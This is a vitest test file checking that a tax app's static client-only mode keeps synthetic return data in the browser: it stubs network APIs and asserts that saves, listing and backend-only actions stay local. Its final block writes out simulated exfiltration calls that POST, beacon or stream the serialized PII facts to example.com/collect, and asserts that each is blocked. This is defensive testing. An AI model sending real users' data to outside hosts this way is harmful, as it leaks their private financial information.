import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
import { PII_MARKERS, scenarioFactGraphJson } from '../saveState/saveStateTestUtils.js';
import { STATIC_BACKEND_URL } from './staticMode.js';

/**
 * Static client-only mode (staticMode.ts) must never send return data to a server.
 *
 * The real app modules run with the static build's settings: the network guard is installed the way index.tsx does
 * it, then the app creates, lists and autosaves a return (golden end-to-end scenario, synthetic data), extends the
 * session, fetches the data import profile and tries the backend-only features (sign, submit, PDF). Every browser
 * egress API starts out as a recorder; none may ever be called, and the facts must stay in the page.
 */
describe(`static client-only mode: no return data leaves the page`, () => {
  const calls: string[] = [];
  const xhrOpen = XMLHttpRequest.prototype.open;
  const xhrSend = XMLHttpRequest.prototype.send;
  const record =
    (what: string) =>
    (...args: unknown[]) => {
      calls.push(`${what} ${args.map((a) => (typeof a === `string` ? a : JSON.stringify(a))).join(` `)}`);
      throw new Error(`network`);
    };

  beforeEach(() => {
    calls.length = 0;
    vi.resetModules();
    vi.stubEnv(`VITE_STATIC_CLIENT_ONLY`, `true`);
    vi.stubEnv(`VITE_BACKEND_URL`, STATIC_BACKEND_URL);
    vi.stubGlobal(`fetch`, vi.fn(record(`fetch`)));
    XMLHttpRequest.prototype.open = record(`xhr.open`) as typeof xhrOpen;
    XMLHttpRequest.prototype.send = record(`xhr.send`) as typeof xhrSend;
    vi.stubGlobal(`WebSocket`, vi.fn(record(`websocket`)));
    vi.stubGlobal(`EventSource`, vi.fn(record(`eventsource`)));
    Object.defineProperty(globalThis.navigator, `sendBeacon`, { configurable: true, value: vi.fn(record(`beacon`)) });
  });

  afterEach(() => {
    XMLHttpRequest.prototype.open = xhrOpen;
    XMLHttpRequest.prototype.send = xhrSend;
    vi.unstubAllGlobals();
    vi.unstubAllEnvs();
    localStorage.clear();
    sessionStorage.clear();
  });

  const installAsIndexTsxDoes = async () => {
    const { installStaticNetworkGuard } = await import('./networkGuard.js');
    const { interceptor } = await import('../hooks/useApiHook.js');
    const recorders = {
      fetch: globalThis.fetch,
      open: XMLHttpRequest.prototype.open,
      beacon: navigator.sendBeacon,
      ws: globalThis.WebSocket,
    };
    installStaticNetworkGuard(
      globalThis as unknown as Parameters<typeof installStaticNetworkGuard>[0],
      STATIC_BACKEND_URL
    );
    globalThis.fetch = interceptor(globalThis.fetch);
    return recorders;
  };

  it(`answers the interview's API calls in the page and refuses every other request`, async () => {
    const recorders = await installAsIndexTsxDoes();
    const { save, read } = await import('../hooks/useApiHook.js');
    const { setupStore } = await import('../redux/store.js');
    const { createTaxReturn, fetchTaxReturns } = await import('../redux/slices/tax-return/taxReturnSlice.js');
    const { SessionClock } = await import('../auth/session.js');
    const { STATIC_UNAVAILABLE, resetLocalApi } = await import('./localApi.js');
    const { BLOCKED_MESSAGE } = await import('./networkGuard.js');
    resetLocalApi();
    const facts = scenarioFactGraphJson();
    const factsText = JSON.stringify(facts);
    const markers = PII_MARKERS.filter((m) => factsText.includes(m));
    expect(markers.length).toBeGreaterThan(0);

    // Start a return, as CreateTaxReturnCard does; this also requests the data import profile.
    const store = setupStore();
    const created = await store.dispatch(createTaxReturn());
    expect(created.meta.requestStatus).toBe(`fulfilled`);
    const id = (created.payload as { id: string }).id;
    expect((created.payload as { taxYear: number }).taxYear).toBe(2026);
    expect((await store.dispatch(fetchTaxReturns())).meta.requestStatus).toBe(`fulfilled`);

    // Autosave, as useSaveAndPersist does, then reload the return list.
    await save(`${STATIC_BACKEND_URL}v1/taxreturns/${id}`, { body: { facts } });
    const listed = await read<{ id: string; facts: unknown }[]>(`${STATIC_BACKEND_URL}v1/taxreturns`);
    expect(listed.map((r) => r.id)).toEqual([id]);
    expect(listed[0].facts).toEqual(facts);

    // Session keep-alive is answered locally.
    new SessionClock().extend();
    await new Promise((r) => setTimeout(r, 0));

    // Backend-only features fail as ordinary API errors.
    for (const action of [`sign`, `submit`, `preview`, `populate`, `status`]) {
      await expect(save(`${STATIC_BACKEND_URL}v1/taxreturns/${id}/${action}`, { body: { facts } })).rejects.toEqual({
        message: STATIC_UNAVAILABLE,
      });
    }

    // Direct attempts to send the facts anywhere are refused.
    await expect(fetch(`https://example.com/collect`, { method: `POST`, body: factsText })).rejects.toThrow(
      BLOCKED_MESSAGE
    );
    await expect(fetch(`/df/file/collect?d=${encodeURIComponent(factsText)}`)).rejects.toThrow(BLOCKED_MESSAGE);
    expect(() => new XMLHttpRequest().open(`POST`, `https://example.com/collect`)).toThrow(BLOCKED_MESSAGE);
    expect(navigator.sendBeacon(`https://example.com/collect`, factsText)).toBe(false);
    expect(() => new (globalThis.WebSocket as unknown as new (u: string) => unknown)(`wss://example.com`)).toThrow(
      BLOCKED_MESSAGE
    );
    expect(() => new (globalThis.EventSource as unknown as new (u: string) => unknown)(`https://example.com`)).toThrow(
      BLOCKED_MESSAGE
    );

    // None of the real network APIs was ever called, and nothing was written to browser storage.
    expect(calls).toEqual([]);
    expect(recorders.fetch).not.toHaveBeenCalled();
    expect(recorders.beacon).not.toHaveBeenCalled();
    expect(recorders.ws).not.toHaveBeenCalled();
    const stored = JSON.stringify({ ...localStorage }) + JSON.stringify({ ...sessionStorage });
    markers.forEach((m) => expect(stored).not.toContain(m));
  });

  it(`turns off telemetry, data import, state transfer and developer tools, and keeps the interview on`, async () => {
    sessionStorage.setItem(`DATAIMPORT_MODE_OVERRIDE`, `real-api`);
    const pc = await import('../constants/pageConstants.js');
    expect(pc.isFlowEnabled()).toBe(true);
    expect(pc.isTelemetryEnabled()).toBe(false);
    expect(pc.isReturnTransferEnabled()).toBe(false);
    expect(pc.isDeveloperToolsEnabled()).toBe(false);
    expect(pc.showPreauthUuidPanelOnDashboard()).toBe(false);
    expect(pc.getDataImportMode()).toBe(`disabled`);
    expect(pc.ENVIRONMENT_CONFIGS.LOCALHOST.hostNames).toEqual([]);
  });

  it(`leaves the regular build unchanged`, async () => {
    vi.stubEnv(`VITE_STATIC_CLIENT_ONLY`, ``);
    const { isStaticClientOnly } = await import('./staticMode.js');
    const pc = await import('../constants/pageConstants.js');
    expect(isStaticClientOnly()).toBe(false);
    expect(pc.ENVIRONMENT_CONFIGS.LOCALHOST.hostNames).toEqual([`http://localhost`]);
    expect(pc.ENVIRONMENT_CONFIGS.STATIC_CLIENT.hostNames).toEqual([]);
  });
});
